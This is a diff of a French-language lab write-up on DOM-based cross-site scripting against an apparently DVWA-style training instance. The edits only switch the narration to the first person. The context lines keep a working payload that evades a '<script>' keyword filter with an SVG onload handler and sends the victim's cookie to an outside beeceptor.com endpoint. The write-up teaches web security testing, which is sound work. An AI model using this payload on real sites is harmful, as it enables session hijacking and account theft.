@@ -28,11 +28,11 @@ Le script permettant de renseigner dynamiquement la valeur sélectionnée dans l
 </form>
 ```
 
-Si l'on tente de récupérer le jeton de notre victime en laissant l'envoi du paramètre au serveur nous recevons une redirection **`302`** qui requête une URL avec en paramètre une valeur whitelistée :
+Lorsque je tente de récupérer le jeton de la victime en laissant l'envoi du paramètre au serveur je reçois une redirection **`302`** qui requête une URL avec en paramètre une valeur whitelistée :
 
 ![](../../../../.gitbook/assets/f0938fc949d8eb827b9eba495e72684e.png)
 
-Tentons de contourner la protection en place. Au bout de quelques essais il apparaît que le mot clé `<script>` soit filtré. Pas de problème, d'autres moyens existent :
+Je tente alors de contourner la protection en place. Au bout de quelques essais il apparaît que le mot clé `<script>` soit filtré. Pas de problème, d'autres moyens existent :
 
 ```markup
 http://192.168.56.203:8080/vulnerabilities/xss_d/?default="></option></select><svg onload="fetch('https://domxss.free.beeceptor.com?cookie='+document.cookie)">
@@ -40,7 +40,7 @@ http://192.168.56.203:8080/vulnerabilities/xss_d/?default="></option></select><s
 
 ![](../../../../.gitbook/assets/48c112771351914b8f74a66fd7795dca.png)
 
-Nous recevons ainsi bien le cookie de la victime :
+Je reçois ainsi bien le cookie de la victime :
 
 ![](../../../../.gitbook/assets/173658120faea612b95bc67947d79b2c.png)
 
@@ -51,4 +51,3 @@ Mais comme vu précédemment, il est possible de valider très simplement ce cha
 Cela permet de s'affranchir complètement de la vérification effectuée côté serveur :
 
 ![](../../../../.gitbook/assets/b7a4c0b328dde5512c704cbd4402dc5e.png)
-
